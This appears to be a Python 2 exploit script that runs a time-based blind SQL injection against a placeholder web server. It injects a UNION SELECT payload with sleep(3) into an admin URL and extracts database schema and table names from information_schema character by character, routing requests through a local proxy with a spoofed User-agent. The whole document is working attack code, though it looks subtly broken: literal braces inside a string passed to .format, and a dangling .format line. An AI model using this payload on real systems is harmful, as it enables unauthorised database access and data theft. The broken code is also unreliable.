#!/usr/bin/env python

import urllib2
import sys
import string
import timeit

max = 0
charset = string.printable

if len(sys.argv) < 2:
	max = 50
else:
	max = int(sys.argv[1])

for i in xrange(max):
	check = False
	for c in charset:
		requesturl = "http://X.X.X.X/site/index.php/admin%27%20union%20select%20null,null,case%20when%20ascii%28substr%28%28select%20concat%28table_schema,%27%20:%20%27,table_name%29%20from%20information_schema.tables%20where%20table_schema!=%27information_schema%27%20limit%201%29,{0},1%29%29={1}%20then%20sleep(3)%20else%201%20end%20--%20/acid/".format(str(i+1), str(ord(c)))
		command = "import urllib2;u=\"{0}\";" \
                          "proxy=urllib2.ProxyHandler({'http': '127.0.0.1:8080'});" \
                          "opener=urllib2.build_opener(proxy);" \
                          "opener.addheaders=[('User-agent', 'Mozilla/5.0 (Windows NT 6.3; WOW64;" \
                          " rv:35.0) Gecko/20100101 Firefox/35.0')," \
                          " ('Accept', 'text/html'), ('Accept-Language', 'en_US,en;q=0.5')]"
			.format(requesturl)
		t = timeit.Timer("opener.open(u)", command)
		if t.timeit(number=1)>3.0:
			check = True
			sys.stdout.write(c)
			break

	if not check:
		break

print ''